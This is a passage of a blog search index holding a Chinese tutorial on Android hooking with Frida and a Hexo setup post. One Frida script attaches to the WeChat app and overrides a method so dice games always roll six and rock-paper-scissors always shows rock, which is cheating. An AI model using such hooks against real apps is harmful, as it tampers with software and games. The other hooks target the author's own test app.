class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*</span></div><div class="line"><span class="keyword">import</span> frida, sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</div><div class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(message)</div><div class="line"></div><div class="line">jscode = <span class="string">"""</span></div><div class="line">Java.perform(function () &#123;</div><div class="line">var be= Java.use("com.tencent.mm.sdk.platformtools.bf");</div><div class="line">send("start")</div><div class="line">be.da.implementation = function()&#123;</div><div class="line"></div><div class="line">    var type = arguments[0];</div><div class="line">    send(type);//5表示掷骰子，2表示猜拳头</div><div class="line">    if(type ==2)&#123;</div><div class="line">    return 1;//表示是石头</div><div class="line">    &#125;else&#123;</div><div class="line">        return 5;//骰子6点</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line">send("end")</div><div class="line">&#125;);</div><div class="line">"""</div><div class="line"></div><div class="line">process = frida.get_usb_device().attach(<span class="string">'com.tencent.mm'</span>)</div><div class="line">script = process.create_script(jscode)</div><div class="line">script.on(<span class="string">'message'</span>, on_message)</div><div class="line">print(<span class="string">'[*] weixin Start...'</span>)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure></p>
+<p>手机上打开微信后，运行代码。<br>然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。<br><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/运行结果.png" alt="运行结果"></p>
+<p>下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。<br>其Android的Activity代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.test.fridatest;</div><div class="line"></div><div class="line"><span class="keyword">import</span> android.app.Activity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.util.Log;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line"></div><div class="line">		<span class="keyword">private</span> Button myButton1;</div><div class="line">		<span class="keyword">private</span> String TAG = <span class="string">"fuping"</span>;</div><div class="line"></div><div class="line">	    <span class="meta">@Override</span></div><div class="line">	    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">	        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">	        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">	        myButton1 = (Button) findViewById(R.id.button1);</div><div class="line">	        myButton1.setOnClickListener( <span class="keyword">new</span> ButtonClick());</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    <span class="class"><span class="keyword">class</span> <span class="title">ButtonClick</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</div><div class="line">	        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">	            <span class="keyword">switch</span> (v.getId()) &#123;</div><div class="line">	            <span class="keyword">case</span> R.id.button1:</div><div class="line">	                <span class="keyword">int</span> nRet = test(<span class="number">4</span>);</div><div class="line">	                String strRet = nRet + <span class="string">""</span>;</div><div class="line">	                Toast.makeText(MainActivity.<span class="keyword">this</span>, strRet,Toast.LENGTH_LONG).show();</div><div class="line">	                Log.i(TAG, <span class="string">"test(int):"</span>+ strRet);</div><div class="line">	                strRet = test(<span class="number">4</span>,<span class="number">2</span>)+<span class="string">""</span>;</div><div class="line">	                Log.i(TAG, <span class="string">"test(int,int):"</span>+ strRet);</div><div class="line">	                strRet = test(<span class="number">4</span>,<span class="string">"2"</span>)+<span class="string">""</span>;</div><div class="line">	                Log.i(TAG, <span class="string">"test(int,String):"</span>+ strRet);</div><div class="line">	                strRet = change(<span class="number">4</span>,<span class="string">"2"</span>)+<span class="string">""</span>;</div><div class="line">	                Log.i(TAG, <span class="string">"change(int,String):"</span>+ strRet);</div><div class="line">	                <span class="keyword">break</span>;</div><div class="line">	            <span class="keyword">default</span>:</div><div class="line">	                <span class="keyword">break</span>;</div><div class="line">	            &#125;</div><div class="line">	        &#125;</div><div class="line"></div><div class="line">	    &#125;</div><div class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span></span></div><div class="line">	    &#123;</div><div class="line">	        <span class="keyword">int</span> nRet = num*<span class="number">2</span>;</div><div class="line">	        <span class="keyword">return</span> nRet;</div><div class="line">	    &#125;</div><div class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> b)</span></span></div><div class="line">	    &#123;</div><div class="line">	        <span class="keyword">int</span> nRet = num*<span class="number">2</span> + b ;</div><div class="line">	        <span class="keyword">return</span> nRet;</div><div class="line">	    &#125;</div><div class="line">	    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(<span class="keyword">int</span> num,String b)</span></span></div><div class="line">	    &#123;</div><div class="line">	    	String nRet = num*<span class="number">2</span> + b ;</div><div class="line">	        <span class="keyword">return</span> nRet;</div><div class="line">	    &#125;</div><div class="line">	    <span class="function"><span class="keyword">public</span> String <span class="title">change</span><span class="params">(<span class="keyword">int</span> num,String b)</span></span></div><div class="line">	    &#123;</div><div class="line">	    	String nRet = num*<span class="number">2</span> + b ;</div><div class="line">	        <span class="keyword">return</span> nRet;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>首先演示一下对change方法的hook。<br>hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。<br>在真机上运行结果如下所示：</p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/对change进行hook.png" alt="对change进行hook"></p>
+<p>发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了）</p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/模拟器上对change方法进行hook.png" alt="模拟器上对change方法进行hook"></p>
+<p>在模拟器上进行Hook后，出现了预期的结果。<br>在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。<br>例如对<code>String test(int num,String b)</code>进行hook时，可以使用如下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> TM = Java.use(<span class="string">"com.test.fridatest.MainActivity"</span>);</div><div class="line">TM.test.overload(<span class="string">"int"</span>,<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a,b</span>) </span>&#123;</div><div class="line">    send(<span class="string">"Called - test(int,String):"</span>+a+<span class="string">"----"</span>+b);</div><div class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.test.overload(<span class="string">"int"</span>,<span class="string">"java.lang.String"</span>).call(<span class="keyword">this</span>,<span class="number">8</span>,<span class="string">"3"</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>附上对test和change同时hook 的结果：</p>
+<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/对test和change的hook.png" alt="对test和change的hook"></p>
+<p>就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol>
+<li><a href="https://www.frida.re/docs/examples/android/" target="_blank" rel="external">https://www.frida.re/docs/examples/android/</a></li>
+<li><a href="https://www.codemetrix.net/hacking-android-apps-with-frida-1/" target="_blank" rel="external">https://www.codemetrix.net/hacking-android-apps-with-frida-1/</a></li>
+<li><a href="http://www.cnblogs.com/konf/p/5998785.html" target="_blank" rel="external">http://www.cnblogs.com/konf/p/5998785.html</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> Android技术 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 安卓Hook </tag>
+            
+            <tag> Frida </tag>
+            
+            <tag> 摇骰子 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Hello World]]></title>
+      <url>/2017/03/20/hello-world/</url>
+      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-blog"><a href="#Create-a-new-blog" class="headerlink" title="Create a new blog"></a>Create a new blog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo init</div></pre></td></tr></table></figure>
+<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+<h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>运行<code>hexo server</code>，浏览器输入<a href="http://localhost:4000" target="_blank" rel="external">http://localhost:4000</a> 无法访问</p>
+<p>产生原因可能是<strong>端口占用</strong>。</p>
+<p>Windows下运行命令<code>netstat -ano | findstr 4000</code>，看是否有有进程占用了4000端口。</p>
+<p><img src="/2017/03/20/hello-world/端口占用.png" alt="端口占用"><br>这是安装了福昕PDF阅读器的原因，将<code>Foxitprotect.exe</code>进程结束即可。</p>
+<h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia</div></pre></td></tr></table></figure>
+<p><img src="/2017/03/20/hello-world/获取主题.png" alt="获取主题"></p>
+<p>修改hexo根目录下的 _config.yml ： <code>theme: yilia</code></p>
+<p>之后运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo g</div><div class="line">hexo s</div></pre></td></tr></table></figure></p>
+<h3 id="修改头像"><a href="#修改头像" class="headerlink" title="修改头像"></a>修改头像</h3><p>hexo根目录下source文件夹中新建assets\img文件夹，将头像文件复制进去<br>修改<strong>主题目录</strong>中的_config.yml ：<code>avatar: /assets/img/avatar.jpg</code></p>
+<p><img src="/2017/03/20/hello-world/修改头像.png" alt="修改头像"></p>
+<h3 id="添加标签"><a href="#添加标签" class="headerlink" title="添加标签"></a>添加标签</h3><h5 id="1-添加标签"><a href="#1-添加标签" class="headerlink" title="1.添加标签"></a>1.添加标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tag: 标签</div></pre></td></tr></table></figure>
+<h5 id="2-添加多个标签"><a href="#2-添加多个标签" class="headerlink" title="2.添加多个标签"></a>2.添加多个标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tags: [标签1,标签2,标签3]</div></pre></td></tr></table></figure>
+<p>或者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tags:</div><div class="line">     - 标签1</div><div class="line">     - 标签2</div></pre></td></tr></table></figure></p>
+<h3 id="文章部分显示"><a href="#文章部分显示" class="headerlink" title="文章部分显示"></a>文章部分显示</h3><p>使用<code>&lt;!-- more --&gt;</code>标签来隐藏其下面的内容~</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+            <tag> 主题 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+  
+  
+</search>
